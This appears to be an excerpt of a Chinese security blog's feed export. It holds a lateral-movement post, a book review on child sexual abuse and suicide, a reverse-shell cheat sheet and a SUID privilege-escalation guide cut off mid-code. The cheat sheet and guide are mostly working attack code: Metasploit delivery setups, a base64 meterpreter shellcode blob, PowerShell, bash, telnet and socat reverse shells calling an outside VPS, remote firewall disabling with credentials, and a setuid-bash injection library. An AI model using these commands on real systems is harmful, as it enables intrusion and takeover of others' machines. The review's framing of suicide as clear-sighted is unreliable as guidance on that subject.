class="hljs-symbol">\t</span>est.dll,0&quot;<br><br>目标机器本地执行成功<br>C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\S</span>CShell.exe local filepermsvc &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe /c C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe <span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\h</span>ltzs<span class="hljs-symbol">\t</span>est.dll,0&quot; . administrator 123456<br><br>攻击机器执行：<br>D:<span class="hljs-symbol">\文</span>件同步<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\横</span>向移动参考资料<span class="hljs-symbol">\工</span>具<span class="hljs-symbol">\S</span>CShell-master<span class="hljs-symbol">\S</span>CShell-master<span class="hljs-symbol">\S</span>CShell.exe 192.168.123.45 filepermsvc &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe /c C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe <span class="hljs-symbol">\\</span>192.168.123.123<span class="hljs-symbol">\h</span>ltzs<span class="hljs-symbol">\t</span>est.dll,0&quot; . administrator 123456<br></code></pre></div></td></tr></table></figure><h2 id="sharpmove"><a href="#sharpmove" class="headerlink" title="sharpmove"></a>sharpmove</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">SharpMove.exe <span class="hljs-attribute">action</span>=startservice <span class="hljs-attribute">computername</span>=remote.host.local <span class="hljs-attribute">servicename</span>=TestService<br></code></pre></div></td></tr></table></figure><h2 id="关闭防火墙命令"><a href="#关闭防火墙命令" class="headerlink" title="关闭防火墙命令"></a>关闭防火墙命令</h2><p>关闭公网上的防火墙<br><code>netsh advfirewall set  currentprofile state off</code></p><p>关闭内网中的防火墙<br><code>netsh advfirewall set privateprofile state off</code></p><h3 id="远程关闭防火墙"><a href="#远程关闭防火墙" class="headerlink" title="远程关闭防火墙"></a>远程关闭防火墙</h3><figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf">netsh -r <span class="hljs-number">192.168</span>.<span class="hljs-number">123.45</span> -u administrator -p <span class="hljs-number">123456</span> -c advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> <span class="hljs-keyword">on</span><br><br></code></pre></div></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior">https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior</a></p><p><a href="https://www.windows-commandline.com/enable-disable-firewall-command-line/">https://www.windows-commandline.com/enable-disable-firewall-command-line/</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://pentestlab.blog/2020/07/21/lateral-movement-services/">https://pentestlab.blog/2020/07/21/lateral-movement-services/</a></p><p><a href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a></p><p><a href="https://github.com/0xthirteen/MoveKit">https://github.com/0xthirteen/MoveKit</a></p><p><a href="https://github.com/0xthirteen/SharpMove">https://github.com/0xthirteen/SharpMove</a></p><p><a href="https://github.com/0xthirteen/SharpRDP">https://github.com/0xthirteen/SharpRDP</a></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>lateral-movement</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《房思琪的初恋乐园》读后感</title>
    <link href="/2020/10/07/11-x/"/>
    <url>/2020/10/07/11-x/</url>
    
    <content type="html"><![CDATA[<p>是谁把贞操牢牢刻在每个人的思想里面？</p><p>封建社会已经过去了一百多年了，封建思想在这片土地上统治了有几千年。与此同时，女性的地位也深受压迫了几千年。在以前，一个女性要是失去了丈夫，那么她就成了一个寡妇，寡妇要为了丈夫守贞。</p><p>我不知道该怎么描述房思琪的事情。</p><p>我有一种深深的无力感。因为我知道什么也改变不了。</p><p>改变不了人们对儿童性教育假性遗忘，改变不了猥亵儿童的犯罪者将手伸向豆蔻之年的花朵。</p><p>总之，这个由真实事件改编的小说反映了几个事实。</p><ol><li><p>只要社会的男性把女性当成是资源，把拥有过多少女性当成是战利品。那么性侵这件事永远不会变少。你以为性侵的都是没有钱去找妓女的人吗？不是，他们享受的是强大的权力、地位等等所带来的支配弱者的征服感。</p></li><li><p>女性能够做的事情很少，我们都是幸存者。被伤害是一种概率，而不是受害者有罪。</p></li></ol><p>刚刚把这本书看完了。一开始我不明白房思琪为什么和强奸犯纠缠了几年。</p><p>要知道，错误的事情，无论包装的多么精致，都不应该沉迷进去。</p><p>我尝试以自己的三观去解读这件事情，并且理解她的视角。</p><p>房思琪是一个富家女，在十三岁的时候，强奸犯住在她家隔壁（不好意思，我实在不能用老师这个词语去形容他），qjf是一个德高望重的补习班名校老师（比房思琪大37岁，也就是50岁），房思琪的父母从来没有教育过孩子任何有关性方面的内容（天知道没有性，房思琪是怎么被她妈生下来的）。在房思琪像qjf请教作文的时候，她被qj了，甚至为此道歉。</p><p>房思琪是个精致、美丽、聪明的女孩，在她的脑子里从来没有被人灌输过有关性的一切。她被qjf欺骗，说是爱情，她是被爱的。在长达5年的过程中，一直与qjf保持着这种不正常的关系。</p><p>也许她在第一次被强迫口j的时候，就应该站出来，向父母求助。也好过身心被伤害，无法过正常的生活，26岁终于自杀。</p><p>热爱文学的人也许内心都很纤细，什么是痛苦，什么是美，体会的比常人更加深刻。</p><p>作者在自杀前，曾经接受过采访，她透露出，这段关系里面是有爱的。如果没有爱，就没有这么痛苦了。</p><p>如果只是单纯的qj，那么该报案的报案，该坐牢的坐牢。而不会将一段不正常的关系维持了5年之久。</p><p>社会上的都说，被qj是受害者自己的错。不是的，作者一丁点儿错都没有。</p><p>但是她就像一个精致的透明水晶高脚杯一样，受伤害了，然后碎了。说这是谁的错？qjf固然有错，社会固然有问题。但是也许她可以更坚强更勇敢。</p><p>如果她像我一样勇敢，那么很多事情都不会发生了。也就是因为她是一个弱者，只会用文字表达在她身上遭受的伤害，所以我们才能看到这本书《房思琪的初恋乐园》。这真是一个悖论。</p><p>我尝试去理解她。但是因为三观、成长环境等等都不同。所以只能猜测，无法产生共鸣。</p><p>我不知道一个比自己大三十七岁，还强迫发生关系的老头子有什么可爱之处。但是不要对受害者要求太高，以为每个女性都是花木兰那不现实。</p><p>如果里面真的有爱情，那么作者最后就不会得抑郁症了，也就不会自杀了。可是明眼人都看得出来，qjf不过是在玩弄她罢了。</p><p>离13岁的我已经过去太久了，我不太记得清楚小时候的想法。13岁，也就是十岁出头，来到这世界上才不过十余年，相对于浩瀚的宇宙来说，动辄上千年的历史来说，太渺小了。这样稚嫩的年纪，什么都懂一点点，但是也什么都不懂。有些长得快的小孩子可能身高超过了一些成年人，但是内心却跟不上现代社会的营养过剩发育迅速，还停留在儿童阶段。</p><p>是什么让一个13岁的女孩反复的去找一个qjf，我认为，缺失的家庭教育要担任首要的责任。如果父母把小孩当成朋友的话，如果父母和孩子无话不谈的话，那么这个小女孩在遭受如此粗暴对待的时候，是不可能不跟父母倾诉的。</p><p>在书里面，房思琪的父母据说经常出差，所以让qjf无所顾忌，觉得房思琪不会说出来。确实如此，作者一直到死都没有说出来。是谁伤害了我？在我身上发生了什么？当作者自杀以后，一切都太晚了。</p><p>为什么世界上有人宁愿伤害自己，也不愿意伤害别人。</p><p>据说作者出生在一个古老的医学世家，并且得了抑郁症还考上了医科大学。因为病情辍学以后又考上了一个中文系。</p><p>她的家庭要求她优秀，但是不要求她幸福、快乐。</p><p>我想想，她的父母只怕是这么想的：一个女孩子，考最好的学校，打扮的漂漂亮亮，然后嫁给一个好丈夫。没有人鼓励她发挥自己的个性，没有人在乎她的理想，没有人在乎她幸不幸福，快不快乐。</p><p>那么她选择离开这个世界，也是情有可原的。</p><p>那些自杀者不是看不清，而是看得太清楚。他们想明白了一切，而不是别人口中的想不开。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows反弹shell</title>
    <link href="/2020/10/04/11-x/"/>
    <url>/2020/10/04/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>以你现在的速度你只能逗留原地。如果你要抵达另一个地方，你必须以双倍于现在的速度奔跑。</p><h2 id="思维导图和教程"><a href="#思维导图和教程" class="headerlink" title="思维导图和教程"></a>思维导图和教程</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-04-11/%E5%8F%8D%E5%BC%B9shell-%20%E8%A7%86%E9%A2%91%E7%9B%AE%E5%BD%95.png" alt="反弹shell- 视频目录"></p><p><a href="https://www.bilibili.com/video/BV1ey4y1k7PA">一句话反弹shell&amp;Reverse Shell In Windows</a></p><p><a href="https://www.bilibili.com/video/BV1oA411M7RM/">Koadic过defender上线</a></p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="mshta-exe"><a href="#mshta-exe" class="headerlink" title="mshta.exe"></a>mshta.exe</h2><h3 id="成功的操作"><a href="#成功的操作" class="headerlink" title="成功的操作"></a>成功的操作</h3><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/windows/misc/hta_server<br><span class="hljs-keyword">set</span> srvhost <span class="hljs-comment">10.100.19.19</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 10.100.19.19</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SRVPORT 53</span><br>exploit<br><br>mshta.exe <span class="hljs-comment">http:</span>//<span class="hljs-comment">10.100.19.19:53</span>/tA7YRzR.hta<br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-04-11/1.PNG" alt="1"></p><h3 id="失败的操作"><a href="#失败的操作" class="headerlink" title="失败的操作"></a>失败的操作</h3><p>设置payload<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.19 LPORT=53 -f raw &gt; shellcode.bin</p><p><code>cat  shellcode.bin | base64 -w 0 &gt; out.txt</code><br>将shellcode.bin base64编码</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/</span><span class="hljs-number">8</span>lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL<span class="hljs-regexp">/4FhBWVpIixLpS/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAA1CgoTE0FUSYnkTInxQbpMdyYH/</span><span class="hljs-number">9</span>VMiepoAQEAAFlBuimAawD<span class="hljs-regexp">/1WoKQV5QUE0xyU0xwEj/</span>wEiJwkj<span class="hljs-regexp">/wEiJwUG66g/</span>f4P<span class="hljs-regexp">/VSInHahBBWEyJ4kiJ+UG6maV0Yf/</span>VhcB0Ckn<span class="hljs-regexp">/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX/</span><span class="hljs-regexp">/Vg/g</span>AflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X<span class="hljs-regexp">/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX/</span><span class="hljs-regexp">/Vg/g</span>AfShYQVdZaABAAABBWGoAWkG6Cy8PMP<span class="hljs-regexp">/VV1lBunVuTWH/</span><span class="hljs-number">1</span>Un<span class="hljs-regexp">/zuk8/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/SAHDSCnGSIX2dbRB/</span>+dYagBZScfC8LWiVv/V<br></code></pre></div></td></tr></table></figure><p>handler -H 10.100.19.19 -P 53 -p windows/meterpreter/reverse_tcp</p><p>mshta.exe <a href="http://10.100.19.19/CACTUSTORCH.hta">http://10.100.19.19/CACTUSTORCH.hta</a></p><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>handler不能设置为exploit/multi/handler</p><h2 id="rundll-exe"><a href="#rundll-exe" class="headerlink" title="rundll.exe"></a>rundll.exe</h2><p>use windows/smb/smb_delivery</p><p>set srvhost 192.168.123.123</p><p>rundll32.exe  \192.168.1.109\vabFG\test.dll,0</p><h2 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/script/web_delivery<br>msf exploit (web_delivery)&gt;<span class="hljs-builtin-name">set</span> target 3<br>msf exploit (web_delivery)&gt; <span class="hljs-builtin-name">set</span> payload windows/meterpreter/reverse_tcp<br>msf exploit (web_delivery)&gt; <span class="hljs-builtin-name">set</span> lhost 192.168.1.109<br>msf exploit (web_delivery)&gt;<span class="hljs-builtin-name">set</span> srvhost 192.168.1.109<br>msf exploit (web_delivery)&gt;exploit<br></code></pre></div></td></tr></table></figure><h2 id="powershell-amp-powercat"><a href="#powershell-amp-powercat" class="headerlink" title="powershell &amp; powercat"></a>powershell &amp; powercat</h2><p>nc -lnvp 4455</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-NoP</span> <span class="hljs-literal">-NonI</span> <span class="hljs-literal">-W</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-Exec</span> Bypass <span class="hljs-literal">-Command</span> <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;192.168.123.123&quot;</span>,<span class="hljs-number">4455</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;PS &quot;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&quot;&gt; &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br>这个代码反弹失败<br>---<br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;192.168.123.123&#x27;,4455);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()&quot;</span><br></code></pre></div></td></tr></table></figure><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><h3 id="bash-tcp"><a href="#bash-tcp" class="headerlink" title="bash tcp"></a>bash tcp</h3><p>nc -lnvp 4456<br>bash -i &gt;&amp; /dev/tcp/18.166.7.104/4456 0&gt;&amp;1</p><h3 id="bash2-（失败）"><a href="#bash2-（失败）" class="headerlink" title="bash2 （失败）"></a>bash2 （失败）</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">4456</span><br><span class="hljs-attribute">exec</span> <span class="hljs-number">5</span>&lt;&gt;/dev/tcp/<span class="hljs-number">18.166.7.104</span>/<span class="hljs-number">4456</span><br><span class="hljs-attribute">cat</span> &lt;&amp;<span class="hljs-number">5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">5</span> &gt;&amp;<span class="hljs-number">5</span>; done<br></code></pre></div></td></tr></table></figure><h3 id="bash-udp（失败）"><a href="#bash-udp（失败）" class="headerlink" title="bash udp（失败）"></a>bash udp（失败）</h3><p>nc -lnvp 4457<br>sh -i &gt;&amp; /dev/udp/18.166.7.104/4457 0&gt;&amp;1</p><h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>victim:</p><p>sh -i &gt;&amp; /dev/udp/192.168.3.253/4242 0&gt;&amp;1</p><p>Centos7:</p><p>csh -i &gt;&amp; /dev/udp/192.168.3.253/4242 0&gt;&amp;1</p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -n -vv -l -p <span class="hljs-number">8080</span> <br><span class="hljs-attribute">nc</span> -n -vv -l -p <span class="hljs-number">8081</span><br><span class="hljs-attribute">Victim</span> <br><span class="hljs-attribute">telnet</span> <span class="hljs-number">18.166.7.104</span>  <span class="hljs-number">8080</span> | /bin/bash | telnet <span class="hljs-number">18.166.7.104</span>  <span class="hljs-number">8081</span><br></code></pre></div></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nc -lnvp <span class="hljs-number">4456</span><br>rm -f <span class="hljs-regexp">/tmp/</span>p; mknod <span class="hljs-regexp">/tmp/</span>p p &amp;&amp; telnet <span class="hljs-number">18.166</span>.<span class="hljs-number">7.104</span> <span class="hljs-number">4456</span> <span class="hljs-number">0</span><span class="hljs-regexp">/tmp/</span>p<br></code></pre></div></td></tr></table></figure><h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><h3 id="建立连接-1"><a href="#建立连接-1" class="headerlink" title="建立连接"></a>建立连接</h3><p>目标机器监听：<br>socat TCP4-listen:4433 STDOUT</p><p>本地连接目标机器：<br>socat - TCP4:18.166.7.104:4433</p><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>vps(18.166.7.104)上监听：<br>socat -d -d TCP4-LISTEN:4434 STDOUT</p><p>本地kali将shell发送到vps<br>（内网机器运行）socat TCP4:18.166.7.104:4434 EXEC:/bin/bash</p><h3 id="反弹shell-二"><a href="#反弹shell-二" class="headerlink" title="反弹shell 二"></a>反弹shell 二</h3><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">（<span class="hljs-number">18.166</span>.<span class="hljs-number">7.104</span>公网机器运行）socat TCP4-<span class="hljs-keyword">listen</span>:<span class="hljs-number">4435</span> STDOUT<br>（内网机器运行）socat <span class="hljs-keyword">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">18.166</span>.<span class="hljs-number">7.104</span>:<span class="hljs-number">4435</span><br></code></pre></div></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/">https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</a></p><p><a href="https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/">https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/</a></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>suid提权的三种思路</title>
    <link href="/2020/08/26/07-x/"/>
    <url>/2020/08/26/07-x/</url>
    
    <content type="html"><![CDATA[<h2 id="制作的视频教程"><a href="#制作的视频教程" class="headerlink" title="制作的视频教程"></a>制作的视频教程</h2><p><a href="https://www.bilibili.com/video/BV1ok4y1m75p">https://www.bilibili.com/video/BV1ok4y1m75p</a></p><h2 id="方法一：shared-object注入"><a href="#方法一：shared-object注入" class="headerlink" title="方法一：shared object注入"></a>方法一：shared object注入</h2><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -type f -perm -04000 -ls 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br>strace <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>suid-so <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-keyword">grep</span> -i -E <span class="hljs-string">&quot;open|access|no such file&quot;</span><br>mkdir <span class="hljs-regexp">/home/u</span>ser/.config<br>vi libcalc.c<br><br><br>#<span class="hljs-keyword">include</span> &lt;stdio.h&gt; <br>#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt; <br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">inject</span>() __attribute__((constructor)); <br><span class="hljs-keyword">void</span> <span class="hljs-keyword">inject</span>() &#123; <br>system(<span class="hljs-string">&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;</span>); <br>&#125;<br><br>gcc -shared -o <span class="hljs-regexp">/home/u</span>ser<span class="hljs-regexp">/.config/</span>libcalc.so -fPIC <span class="hljs-regexp">/home/u</span>ser<span class="hljs-regexp">/.config/</span>libcalc.c<br><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>suid-so<br></code></pre></div></td></tr></table></figure><p>原理：某些程序运行时候，有着管理员权限，却可以被任何用户调用，这就是suid权限。<br>如果这个suid程序调用了某些shared object，可以通过伪造shared object，来伪造命令。以该程序的root权限，去执行提权命令。<br><code>cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p</code></p><p>注意，suid权限必须是二进制程序才能用，脚本程序是无效的。<br>概念：动态链接与静态链接的区别<br>         .dll与.so的区别<br>编译语言编程基础，熟悉linux命令</p><h2 id="方法二：symlik——符号链接"><a href="#方法二：symlik——符号链接" class="headerlink" title="方法二：symlik——符号链接"></a>方法二：symlik——符号链接</h2><p>需要www-data权限，nginx版本在1.6.2-5+deb8u3版本以下。</p><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">dpkg</span> -l | grep nginx<br><span class="hljs-title">su</span> -l www-<span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></div></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">使用exp去执行获得root权限，具体请看视频教程<br><span class="hljs-regexp">/home/u</span>ser<span class="hljs-regexp">/tools/</span>nginx<span class="hljs-regexp">/nginxed-root.sh /</span>var<span class="hljs-regexp">/log/</span>nginx/error.log<br><br>invoke-rc.d nginx rotate &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="方法三：环境变量"><a href="#方法三：环境变量" class="headerlink" title="方法三：环境变量"></a>方法三：环境变量</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">find <span class="hljs-regexp">/ -type f -perm -04000 -ls 2&gt;/</span>dev/null<br><span class="hljs-regexp">//</span>查看有suid权限的程序<br><br>strings <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>suid-env<br><span class="hljs-regexp">//</span>查看二进制文件使用的函数<br><br>whereis service<br><span class="hljs-regexp">//</span>查看service的路径<br><span class="hljs-regexp">/usr/</span>sbin/service<br><br>---<br>echo <span class="hljs-variable">$PATH</span><br>echo <span class="hljs-variable">$USER</span><br>echo <span class="hljs-variable">$PWD</span><br>echo <span 